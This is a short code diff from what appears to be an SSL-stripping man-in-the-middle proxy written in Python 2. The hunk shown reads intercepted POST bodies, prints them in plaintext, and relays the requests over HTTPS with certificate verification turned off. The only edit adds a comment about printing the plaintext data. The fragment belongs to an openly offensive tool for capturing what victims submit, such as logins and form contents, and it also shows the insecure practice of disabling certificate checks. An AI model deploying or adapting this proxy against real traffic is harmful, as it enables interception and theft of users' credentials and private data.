@@ -85,7 +85,7 @@ class SSLStripProxy(BaseHTTPRequestHandler):
             # Read content length and body
             content_length = int(self.headers.getheader('Content-Length', 0))
             post_data = self.rfile.read(content_length)
-            print "[*] POST data:", post_data
+            print "[*] POST data:", post_data # Printing the plaintext data
 
             parsed = urlparse.urlparse(url)
             conn = httplib.HTTPSConnection(parsed.hostname, parsed.port or 443, context=ssl._create_unverified_context())
